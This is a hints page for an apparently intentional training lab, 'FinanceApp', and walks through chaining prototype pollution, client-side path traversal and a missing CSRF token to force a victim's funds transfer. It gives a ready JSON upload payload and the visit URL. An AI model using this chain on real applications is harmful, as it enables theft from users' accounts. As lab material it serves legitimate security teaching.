FinanceApp - Hints

The hardest challenge. Multiple bugs must be chained to steal funds. Only reveal what you need.

Open DevTools and study the JavaScript source and network requests. The page makes multiple fetch calls on load. One of them loads settings from a path that includes a URL parameter. There's also a URL parameter parser that builds a nested object from query string parameters.
Surface 1: The URL parameter parser (parseUrlParams) builds nested objects from key[nested]=value syntax without blocking __proto__.
Surface 2: The ?config= parameter controls a fetch path (CSPT).
Surface 3: The transfer endpoint has no CSRF protection.
The page fetches /api/settings/{config} where config comes from ?config= URL parameter. The response is processed: title goes to innerHTML, and autoApply actions are executed as authenticated fetch requests. You can upload malicious JSON via /api/upload and traverse to it.
Upload JSON containing an autoApply action that calls /api/finance/transfer with {to: 'attacker', amount: 10000}. Then use CSPT: visit the page with ?config=../files/{fileId}. The auto-apply triggers the transfer with the victim's session cookies. No CSRF token required.
1. POST /api/upload with body: {"content":"{\"autoApply\":[{\"endpoint\":\"/api/finance/transfer\",\"method\":\"POST\",\"body\":{\"to\":\"attacker\",\"amount\":10000}}]}", "contentType":"application/json"}
2. Note the fileId from the response.
3. Login as victim on the FinanceApp.
4. Visit /labs/capstone/capstone6.html?config=../files/{fileId}.
5. The autoApply fires the transfer. Lab solved when the transfer goes through.
